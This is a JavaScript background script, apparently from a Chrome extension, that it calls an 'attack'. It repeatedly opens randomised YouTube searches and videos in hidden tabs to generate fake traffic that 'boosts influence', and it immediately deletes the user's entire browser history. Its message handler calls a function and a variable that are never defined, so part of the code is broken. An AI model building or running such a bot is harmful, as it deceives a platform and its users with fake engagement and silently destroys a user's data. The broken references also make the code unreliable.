const searchQueries = [
    "how knights trained for battle",
    "medieval castle defense tactics",
    "life of a blacksmith in the 14th century",
    "how big is the universe really",
    "what if Earth had rings like Saturn",
    "strangest exoplanets ever discovered",
    "real-life sightings of the Loch Ness monster",
    "do aliens exist? latest NASA discoveries",
    "why do people believe in the flat Earth theory",
    "how to survive alone in the wild with no tools",
    "ancient humans vs modern survival skills",
    "building an underground house from scratch",
    "how to solve a Rubik’s cube blindfolded",
    "most bizarre world records ever set",
    "how to make a sword from raw iron ore"
];

function performSearchAttack() {
    const query = searchQueries[Math.floor(Math.random() * searchQueries.length)];
    const searchUrl = `https://www.youtube.com/results?search_query=${encodeURIComponent(query)}`;

    chrome.tabs.create({ url: searchUrl, active: false }, (tab) => {
        setTimeout(() => chrome.tabs.remove(tab.id), 5000);
    });

    console.log(`Performed search: ${query}`);
}

// **OPEN RANDOM VIDEOS FROM SEARCH (Boosts Influence)**
function watchRandomSearchVideo() {
    const query = searchQueries[Math.floor(Math.random() * searchQueries.length)];
    const searchUrl = `https://www.youtube.com/results?search_query=${encodeURIComponent(query)}`;

    fetch(searchUrl)
        .then(response => response.text())
        .then(html => {
            const videoIdRegex = /\"videoId\":\"([^\"]+)\"/g;
            let videoIds = [];
            let match;

            while ((match = videoIdRegex.exec(html)) !== null) {
                videoIds.push(match[1]);
            }

            if (videoIds.length > 0) {
                const randomVideoId = videoIds[Math.floor(Math.random() * videoIds.length)];
                const watchUrl = `https://www.youtube.com/watch?v=${randomVideoId}`;

                chrome.tabs.create({ url: watchUrl, active: false }, (tab) => {
                    setTimeout(() => chrome.tabs.remove(tab.id), 8000); // Watch for 8 sec
                });

                console.log(`Watched video briefly: ${watchUrl}`);
            }
        })
        .catch(error => console.error("Failed to watch video:", error));
}

// **CLEAR WATCH HISTORY AUTOMATICALLY**
function clearWatchHistory() {
    chrome.history.deleteAll(() => console.log("Watch history cleared"));
}

// **Run attack every 5 seconds**
setInterval(performSearchAttack, 5 * 1000);

// **Watch random video every 5 minutes**
setInterval(watchRandomSearchVideo, 5 * 60 * 1000);

// **Clear history every 10 minutes**
// setInterval(clearWatchHistory, 10 * 60 * 1000);

// **Start immediately**
clearWatchHistory();
performSearchAttack();
watchRandomSearchVideo();



chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "openVideo") {
        chrome.tabs.create({ url: message.url, active: false }, (tab) => {
            setTimeout(() => {
                chrome.tabs.remove(tab.id); // Close the tab after 60-120s
            }, Math.floor(Math.random() * (120 - 60) + 60) * 1000);
        });
    }

    if (message.action === "startAttack") {
        attackInterval = setInterval(performSearch, 10 * 60 * 1000);
        performSearch();
    }

    if (message.action === "stopAttack") {
        clearInterval(attackInterval);
    }
});
